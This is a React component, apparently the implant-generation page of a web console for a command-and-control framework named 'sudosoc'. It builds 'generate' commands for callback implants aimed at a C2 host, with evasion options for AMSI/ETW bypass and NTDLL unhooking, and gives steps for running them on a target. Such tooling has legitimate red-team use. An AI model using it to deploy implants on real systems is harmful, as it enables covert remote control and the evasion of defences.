import { useState } from 'react'
import { Cpu, Copy, CheckCheck, Terminal as TermIcon, Zap } from 'lucide-react'

// ─── Types ────────────────────────────────────────────────────────────────────

interface ImplantConfig {
  os:        string
  arch:      string
  protocol:  string
  c2host:    string
  c2port:    string
  format:    string
  evasion:   boolean
  obfuscate: boolean
  debug:     boolean
  name:      string
  savePath:  string
}

// ─── Helpers ──────────────────────────────────────────────────────────────────

const OS_OPTS    = ['windows', 'linux', 'macos', 'android']
const ARCH_OPTS  = ['amd64', 'arm64', 'arm', '386']
const PROTO_OPTS = ['mtls', 'https', 'http', 'dns', 'wg']
const FMT_OPTS   = ['exe', 'shared', 'shellcode', 'service']

const DEFAULT: ImplantConfig = {
  os: 'windows', arch: 'amd64', protocol: 'mtls',
  c2host: '', c2port: '8888',
  format: 'exe', evasion: true, obfuscate: false, debug: false,
  name: '', savePath: '/tmp/',
}

// Build the command string that the operator can paste into the console
function buildCommand(c: ImplantConfig): string {
  const parts = [`generate --${c.protocol} ${c.c2host || '<C2_IP>'}:${c.c2port}`]
  parts.push(`--os ${c.os}`)
  parts.push(`--arch ${c.arch}`)
  if (c.format !== 'exe') parts.push(`--format ${c.format}`)
  if (c.evasion)   parts.push('--evasion')
  if (c.obfuscate) parts.push('--obfuscate')
  if (c.debug)     parts.push('--debug')
  if (c.name)      parts.push(`--name ${c.name}`)
  parts.push(`--save ${c.savePath || '/tmp/'}`)
  return parts.join(' \\\n  ')
}

// ─── Component ────────────────────────────────────────────────────────────────

export default function Generate() {
  const [cfg, setCfg]     = useState<ImplantConfig>(DEFAULT)
  const [copied, setCopied] = useState(false)

  function set<K extends keyof ImplantConfig>(key: K, val: ImplantConfig[K]) {
    setCfg(prev => ({ ...prev, [key]: val }))
  }

  function copyCmd() {
    navigator.clipboard.writeText(buildCommand(cfg)).then(() => {
      setCopied(true)
      setTimeout(() => setCopied(false), 2000)
    })
  }

  const cmd = buildCommand(cfg)

  return (
    <div className="flex flex-col gap-6 h-full max-w-4xl mx-auto w-full">

      {/* ── Header ────────────────────────────────────────────────────── */}
      <div>
        <h2 className="text-primary font-bold text-lg flex items-center gap-2">
          <Cpu size={18} /> Generate Implant
        </h2>
        <p className="text-muted text-xs mt-1">
          Configure your implant below, then paste the generated command into the server console.
        </p>
      </div>

      <div className="grid grid-cols-1 md:grid-cols-2 gap-6">

        {/* ── Left: Config form ──────────────────────────────────────── */}
        <div className="flex flex-col gap-4">

          {/* Target */}
          <section className="rounded-lg border border-border bg-surface p-4 flex flex-col gap-3">
            <h3 className="text-xs uppercase tracking-widest text-muted flex items-center gap-1">
              <TermIcon size={11} /> Target Platform
            </h3>
            <div className="grid grid-cols-2 gap-3">
              <div>
                <label className="text-[10px] text-muted mb-1 block">OS</label>
                <select value={cfg.os} onChange={e => set('os', e.target.value)}
                  className="w-full bg-bg border border-border rounded px-2 py-1.5 text-xs text-text focus:border-primary outline-none">
                  {OS_OPTS.map(o => <option key={o} value={o}>{o}</option>)}
                </select>
              </div>
              <div>
                <label className="text-[10px] text-muted mb-1 block">Architecture</label>
                <select value={cfg.arch} onChange={e => set('arch', e.target.value)}
                  className="w-full bg-bg border border-border rounded px-2 py-1.5 text-xs text-text focus:border-primary outline-none">
                  {ARCH_OPTS.map(a => <option key={a} value={a}>{a}</option>)}
                </select>
              </div>
              <div>
                <label className="text-[10px] text-muted mb-1 block">Output Format</label>
                <select value={cfg.format} onChange={e => set('format', e.target.value)}
                  className="w-full bg-bg border border-border rounded px-2 py-1.5 text-xs text-text focus:border-primary outline-none">
                  {FMT_OPTS.map(f => <option key={f} value={f}>{f}</option>)}
                </select>
              </div>
              <div>
                <label className="text-[10px] text-muted mb-1 block">Implant Name (optional)</label>
                <input value={cfg.name} onChange={e => set('name', e.target.value)}
                  placeholder="phantom_001"
                  className="w-full bg-bg border border-border rounded px-2 py-1.5 text-xs text-text placeholder-muted focus:border-primary outline-none" />
              </div>
            </div>
          </section>

          {/* C2 */}
          <section className="rounded-lg border border-border bg-surface p-4 flex flex-col gap-3">
            <h3 className="text-xs uppercase tracking-widest text-muted flex items-center gap-1">
              <Zap size={11} /> C2 Channel
            </h3>
            <div>
              <label className="text-[10px] text-muted mb-1 block">Protocol</label>
              <div className="flex flex-wrap gap-1.5">
                {PROTO_OPTS.map(p => (
                  <button key={p} onClick={() => set('protocol', p)}
                    className={`px-3 py-1 rounded text-xs border transition-colors ${
                      cfg.protocol === p
                        ? 'border-primary text-primary bg-primary/10'
                        : 'border-border text-muted hover:border-muted'
                    }`}>
                    {p.toUpperCase()}
                  </button>
                ))}
              </div>
            </div>
            <div className="grid grid-cols-3 gap-2">
              <div className="col-span-2">
                <label className="text-[10px] text-muted mb-1 block">C2 Host / Domain</label>
                <input value={cfg.c2host} onChange={e => set('c2host', e.target.value)}
                  placeholder="192.168.1.10"
                  className="w-full bg-bg border border-border rounded px-2 py-1.5 text-xs text-text placeholder-muted focus:border-primary outline-none" />
              </div>
              <div>
                <label className="text-[10px] text-muted mb-1 block">Port</label>
                <input value={cfg.c2port} onChange={e => set('c2port', e.target.value)}
                  className="w-full bg-bg border border-border rounded px-2 py-1.5 text-xs text-text focus:border-primary outline-none" />
              </div>
            </div>
          </section>

          {/* Evasion */}
          <section className="rounded-lg border border-border bg-surface p-4 flex flex-col gap-3">
            <h3 className="text-xs uppercase tracking-widest text-muted">Evasion Options</h3>
            {[
              { key: 'evasion',   label: 'Evasion',   desc: 'AMSI bypass, ETW bypass, sleep obfuscation, NTDLL unhooking' },
              { key: 'obfuscate', label: 'Obfuscate', desc: 'Garble source obfuscation (requires make assets)' },
              { key: 'debug',     label: 'Debug',     desc: 'Enable debug output (verbose, disable for ops)' },
            ].map(({ key, label, desc }) => (
              <label key={key} className="flex items-start gap-3 cursor-pointer group">
                <div className="relative mt-0.5">
                  <input type="checkbox"
                    checked={cfg[key as keyof ImplantConfig] as boolean}
                    onChange={e => set(key as keyof ImplantConfig, e.target.checked as never)}
                    className="sr-only" />
                  <div className={`w-8 h-4 rounded-full transition-colors ${
                    cfg[key as keyof ImplantConfig] ? 'bg-primary' : 'bg-border'
                  }`}>
                    <div className={`absolute top-0.5 w-3 h-3 rounded-full bg-bg transition-transform ${
                      cfg[key as keyof ImplantConfig] ? 'translate-x-4' : 'translate-x-0.5'
                    }`} />
                  </div>
                </div>
                <div>
                  <div className="text-xs text-text">{label}</div>
                  <div className="text-[10px] text-muted">{desc}</div>
                </div>
              </label>
            ))}
          </section>

          {/* Save path */}
          <div>
            <label className="text-[10px] text-muted mb-1 block">Save Path</label>
            <input value={cfg.savePath} onChange={e => set('savePath', e.target.value)}
              className="w-full bg-bg border border-border rounded px-2 py-1.5 text-xs text-text focus:border-primary outline-none font-mono" />
          </div>
        </div>

        {/* ── Right: Command output ────────────────────────────────── */}
        <div className="flex flex-col gap-3">
          <div className="flex items-center justify-between">
            <h3 className="text-xs uppercase tracking-widest text-muted">Generated Command</h3>
            <button onClick={copyCmd}
              className="flex items-center gap-1 text-xs text-muted hover:text-primary transition-colors">
              {copied ? <><CheckCheck size={12} className="text-primary" /> Copied!</> : <><Copy size={12} /> Copy</>}
            </button>
          </div>

          {/* Command box */}
          <div className="flex-1 rounded-lg border border-border bg-surface p-4 font-mono text-xs text-primary overflow-auto min-h-[120px]">
            <span className="text-muted select-none">sudosoc {'>'} </span>
            <span className="whitespace-pre-wrap break-all">{cmd}</span>
          </div>

          {/* Instructions */}
          <div className="rounded-lg border border-border bg-surface p-4 flex flex-col gap-2 text-xs">
            <h4 className="text-warn font-semibold">How to use</h4>
            <ol className="flex flex-col gap-1.5 text-muted list-decimal list-inside">
              <li>Start a listener: <span className="text-text font-mono">sudosoc {'>'} {cfg.protocol}</span></li>
              <li>Copy the command above</li>
              <li>Paste into the server console (terminal mode)</li>
              <li>Transfer the generated binary to your target</li>
              <li>Execute it — session appears here when it connects</li>
            </ol>
          </div>

          {/* Quick reference */}
          <div className="rounded-lg border border-border bg-surface p-4 flex flex-col gap-2 text-xs">
            <h4 className="text-muted font-semibold uppercase tracking-widest text-[10px]">Port Reference</h4>
            <div className="grid grid-cols-2 gap-1 text-[10px]">
              {[
                ['mTLS', '8888'], ['HTTPS', '443'], ['HTTP', '80'],
                ['DNS', '53'], ['WireGuard', '51820'],
              ].map(([proto, port]) => (
                <div key={proto} className="flex justify-between">
                  <span className="text-muted">{proto}</span>
                  <span className="text-text font-mono">{port}</span>
                </div>
              ))}
            </div>
          </div>
        </div>
      </div>
    </div>
  )
}
